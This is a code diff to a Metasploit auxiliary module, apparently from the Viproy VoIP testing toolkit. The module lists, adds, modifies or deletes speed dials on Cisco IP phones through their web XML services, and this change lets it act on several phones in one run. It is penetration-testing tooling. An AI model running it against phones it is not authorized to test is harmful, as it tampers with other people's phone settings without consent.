@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -32,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
     [
       Opt::RPORT(80),
       OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
-      OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
+      OptString.new('MAC', [ true, 'MAC Address(es) of target phone(s)', '000000000000']),
       OptString.new('ACTION', [ true, 'Speed Dials Action: LIST|MODIFY|ADD|DELETE', 'LIST']),
       OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
       OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
@@ -42,15 +42,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     uri = normalize_uri(target_uri.to_s)
-    mac = Rex::Text.uri_encode(datastore["MAC"])
+    macs = Rex::Text.uri_encode(datastore["MAC"])
     name = Rex::Text.uri_encode(datastore["NAME"])
     position = Rex::Text.uri_encode(datastore["POSITION"])
     telno = Rex::Text.uri_encode(datastore["TELNO"])
-
+   macs.split(/%0a|\r|\n/).each {|mac|
 
     case datastore["ACTION"].upcase
       when 'MODIFY'
-        print_status("Deleting Speed Dial of the IP phone")
+        print_status("Deleting Speed Dial of the IP phone #{mac}")
         url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
         vprint_status("URL: "+url)
         res=send_rcv(url)
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
           print_error("Speed Dial is not found!")
         end
       when 'DELETE'
-        print_status("Deleting Speed Dial of the IP phone")
+        print_status("Deleting Speed Dial of the IP phone #{mac}")
         url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
         vprint_status("URL: "+url)
         res=send_rcv(url)
@@ -93,13 +93,14 @@ class Metasploit3 < Msf::Auxiliary
           print_error("Speed Dial couldn't add!")
         end
     else
-      print_status("Getting Speed Dials of the IP phone")
+      print_status("Getting Speed Dials of the IP phone #{mac}")
       url=uri+"/speeddials.cgi?device=SEP#{mac}"
       vprint_status("URL: "+url)
 
       res=send_rcv(url)
       parse(res) if res != Exploit::CheckCode::Safe
     end
+  }
 
   end
 
